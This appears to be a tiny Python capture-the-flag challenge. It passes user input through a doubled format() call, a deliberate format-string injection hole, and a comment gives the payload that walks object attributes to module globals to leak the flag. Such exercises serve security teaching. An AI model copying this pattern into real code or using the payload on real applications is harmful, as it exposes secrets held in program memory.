flag = "RAT{f0rm4t_str1ng_1n_pyth0n?!}"
#flag = open("flag.txt","r").read()
class Name(str):
    def __new__(cls, value):
        return str.__new__(cls, value)
a = Name(input("What is your name: "))
print("Hello {}".format(a).format(a)) 
#{0.__class__.__new__.__globals__[flag]}
